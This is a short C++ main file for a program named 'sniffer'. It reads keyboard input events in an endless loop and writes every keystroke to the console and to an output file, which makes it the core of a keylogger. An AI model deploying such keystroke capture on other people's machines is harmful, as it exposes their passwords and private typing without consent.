#include <iostream>
#include "io/keyboardEventReader.h"
#include "utils/keyboardEventUtils.h"
#include "io/utils.h"

int main(int argc, char **argv) {
    if (argc != 2) {
        std::cerr << "USAGE: sniffer FILENAME" << std::endl;
        exit(1);
    }
    std::string outputFileName = argv[1];
    std::ofstream outputFile{outputFileName, std::iostream::app};
    SnifferIO::checkFileStream(outputFile, outputFileName);

    std::ifstream keyboardEventFile = KeyboardEventReader::getKeyboardEventFile();

    while (true) {
        input_event inputEvent = KeyboardEventReader::getNextKeyPressEvent(keyboardEventFile);
        std::cout << KeyboardEventUtils::convertEventCodeToString(inputEvent.code) << std::endl;
        outputFile << KeyboardEventUtils::convertEventCodeToString(inputEvent.code) << std::endl;
    }

}